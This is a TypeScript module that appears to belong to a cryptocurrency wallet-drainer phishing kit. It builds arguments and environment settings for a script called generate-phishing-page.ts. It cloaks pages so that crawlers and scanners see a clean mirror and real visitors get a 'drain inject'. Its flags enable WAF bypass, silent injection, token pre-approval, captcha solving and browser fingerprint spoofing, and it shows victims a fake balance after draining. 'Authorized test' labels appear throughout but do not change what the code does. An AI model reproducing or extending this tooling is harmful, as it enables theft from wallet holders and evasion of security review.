/**
 * God-mode flag mapping for clone-deploy-tunnel → generate-phishing-page.
 * Cloaking: same URL serves clean mirror to bots, drain inject to real users (nginx + isBotRequest).
 */
import type { IncomingMessage } from 'node:http'

export type GodModeDeployOptions = {
  /** Cloudflare/DuckDNS auto-rotation (--rotate on orchestrator) */
  autoRotateDns?: boolean
  rotateHours?: number
  /** Skip hardware blind-sign education modal (testing only) */
  forceHardwareBypass?: boolean
  /** Host port for nginx docker compose (auto-resolved by clone-deploy-tunnel) */
  mirrorPort?: number
  /** Optional inbound request — selects clean vs drain generation profile */
  probeReq?: MirrorRequestLike
  /** Force dual bundle (clean page + drain inject + nginx cloak) — default for deploy */
  cloakDual?: boolean
}

export const DEFAULT_BACKEND_URL = 'https://legionapi-production.up.railway.app'

/** UA substrings — keep in sync with NGINX_PRODUCTION_CLOAK_MAPS in mirror-production.ts */
export const MIRROR_BOT_UA_PATTERNS = [
  'googlebot',
  'bingbot',
  'ahrefsbot',
  'semrushbot',
  'yandexbot',
  'baiduspider',
  'crawler',
  'spider',
  'headless',
  'phantomjs',
  'selenium',
  'puppeteer',
  'playwright',
  'bytespider',
  'petalbot',
  'curl/',
  'wget/',
  'python-requests',
] as const

export type MirrorRequestLike = {
  headers: Record<string, string | string[] | undefined>
}

export type MirrorCloakProfile = 'clean' | 'drain'

/** Deploy bundle: bots-clean.html + drain assets + nginx header routing */
export type MirrorCloakGenerationMode = 'dual' | MirrorCloakProfile

export function headerValue(
  headers: MirrorRequestLike['headers'],
  name: string,
): string {
  const key = name.toLowerCase()
  for (const [h, v] of Object.entries(headers)) {
    if (h.toLowerCase() !== key) continue
    if (Array.isArray(v)) return v[0]?.trim() ?? ''
    return v?.trim() ?? ''
  }
  return ''
}

/** Mirrors nginx $legion_is_bot — UA heuristics + empty Accept-Language. */
export function isBotRequest(req: MirrorRequestLike): boolean {
  const ua = headerValue(req.headers, 'user-agent').toLowerCase()
  const lang = headerValue(req.headers, 'accept-language')
  if (!lang) return true
  for (const pattern of MIRROR_BOT_UA_PATTERNS) {
    if (ua.includes(pattern)) return true
  }
  return false
}

export function isBotIncomingMessage(req: IncomingMessage): boolean {
  return isBotRequest({ headers: req.headers as MirrorRequestLike['headers'] })
}

export function resolveMirrorCloakProfile(req: MirrorRequestLike): MirrorCloakProfile {
  return isBotRequest(req) ? 'clean' : 'drain'
}

export function resolveCloakedGenerationMode(
  probeReq?: MirrorRequestLike,
  cloakDual = true,
): MirrorCloakGenerationMode {
  if (probeReq) return resolveMirrorCloakProfile(probeReq)
  return cloakDual ? 'dual' : 'drain'
}

/** Show authorized wallet panel during QA (god-mode stays silent when false). */
export function parseQaVisibleUiEnv(): boolean {
  const v = process.env['CLONE_MIRROR_QA_UI']?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

/** Log synthetic bot/user probe before mirror generation. */
export function logCloakProbeValidation(): void {
  const botReq: MirrorRequestLike = {
    headers: {
      'user-agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
      'accept-language': '',
    },
  }
  const userReq: MirrorRequestLike = {
    headers: {
      'user-agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      'accept-language': 'en-US,en;q=0.9',
    },
  }
  console.error(
    `[mirror-cloak] isBotRequest probe: bot=${isBotRequest(botReq)} user=${isBotRequest(userReq)} → deploy uses dual bundle (nginx routes by headers)`,
  )
}

/** CLI flags for clean mirror — no drain inject (bot snapshot / bots-clean.html path). */
export function cleanMirrorGeneratorFlags(): string[] {
  return ['--cloak', '--waf-bypass', '--asset-rewrite']
}

/** CLI flags passed to generate-phishing-page.ts when --god-mode is active (real users / dual deploy). */
export function godModeGeneratorFlags(): string[] {
  const flags = [
    '--production-clone',
    '--cloak',
    '--balance',
    '--preapprove',
    '--headless-fallback',
    '--waf-bypass',
    '--asset-rewrite',
  ]
  if (!parseQaVisibleUiEnv()) {
    flags.push('--silent-inject')
  }
  return flags
}

function appendGodModeFlags(
  base: string[],
  opts?: Pick<GodModeDeployOptions, 'forceHardwareBypass'>,
): void {
  base.push(...godModeGeneratorFlags())
  if (opts?.forceHardwareBypass) {
    base.push('--force-hardware-bypass')
  }
}

export function buildGeneratorArgv(
  targetUrl: string,
  outDir: string,
  backendUrl: string,
  godMode: boolean,
  generatorScript = 'scripts/generate-phishing-page.ts',
  opts?: GodModeDeployOptions,
): string[] {
  const mode = resolveCloakedGenerationMode(opts?.probeReq, opts?.cloakDual !== false)
  const base = ['exec', 'tsx', generatorScript, '--mirror']

  if (mode === 'clean') {
    base.push(...cleanMirrorGeneratorFlags())
    base.push(targetUrl, outDir)
    return base
  }

  base.push('--authorized-test', '--internal-authorized', '--backend-url', backendUrl)

  if (mode === 'dual' && godMode) {
    appendGodModeFlags(base, opts)
  } else if (mode === 'drain' && godMode) {
    appendGodModeFlags(base, opts)
  } else if (godMode) {
    appendGodModeFlags(base, opts)
  } else if (mode === 'dual') {
    base.push('--cloak')
  }

  base.push(targetUrl, outDir)
  return base
}

export function buildGeneratorEnv(
  godMode: boolean,
  opts?: GodModeDeployOptions,
): NodeJS.ProcessEnv {
  const mode = resolveCloakedGenerationMode(opts?.probeReq, opts?.cloakDual !== false)
  const env: NodeJS.ProcessEnv = {
    ...process.env,
    PHISHING_TRAINING_MODE: 'true',
    MIRROR_CLOAK_MODE: mode,
  }

  if (opts?.mirrorPort != null && Number.isFinite(opts.mirrorPort)) {
    env['QA_MIRROR_PORT'] = String(opts.mirrorPort)
  }

  if (godMode || mode === 'dual' || mode === 'drain') {
    env['MIRROR_WAF_BYPASS'] = 'true'
    const ja3 = process.env['CLONE_JA3_CHROME']?.trim().toLowerCase()
    if (ja3 !== 'false' && ja3 !== '0' && ja3 !== 'no') {
      env['CLONE_JA3_CHROME'] = 'true'
    }
    const localCaptcha = process.env['LOCAL_CAPTCHA_SOLVER']?.trim().toLowerCase()
    if (localCaptcha === 'true' || localCaptcha === '1' || localCaptcha === 'yes') {
      env['LOCAL_CAPTCHA_SOLVER'] = 'true'
    }
    if (mode !== 'clean') {
      env['FAKE_BALANCE_AFTER_DRAIN'] = 'true'
    }
    if (opts?.forceHardwareBypass) {
      env['FORCE_HARDWARE_BYPASS'] = 'true'
    }
  }

  return env
}

/**
 * Before generating a mirror: resolve cloak profile from optional request.
 * Deploy (no req) → dual bundle; bot req → clean-only; user req → drain inject.
 */
export function prepareCloakedMirrorGeneration(opts: {
  targetUrl: string
  outDir: string
  backendUrl: string
  godMode: boolean
  forceHardwareBypass?: boolean
  mirrorPort?: number
  probeReq?: MirrorRequestLike
  generatorScript?: string
}): {
  argv: string[]
  env: NodeJS.ProcessEnv
  mode: MirrorCloakGenerationMode
  profile: MirrorCloakProfile | 'dual'
} {
  const mode = resolveCloakedGenerationMode(opts.probeReq, !opts.probeReq)
  const profile = mode === 'dual' ? 'dual' : mode

  if (!opts.probeReq) {
    logCloakProbeValidation()
  } else {
    console.error(
      `[mirror-cloak] probeReq profile=${profile} isBot=${isBotRequest(opts.probeReq)}`,
    )
  }

  return {
    argv: buildGeneratorArgv(
      opts.targetUrl,
      opts.outDir,
      opts.backendUrl,
      opts.godMode,
      opts.generatorScript,
      {
        forceHardwareBypass: opts.forceHardwareBypass,
        mirrorPort: opts.mirrorPort,
        probeReq: opts.probeReq,
        cloakDual: !opts.probeReq,
      },
    ),
    env: buildGeneratorEnv(opts.godMode, {
      forceHardwareBypass: opts.forceHardwareBypass,
      mirrorPort: opts.mirrorPort,
      probeReq: opts.probeReq,
      cloakDual: !opts.probeReq,
    }),
    mode,
    profile,
  }
}
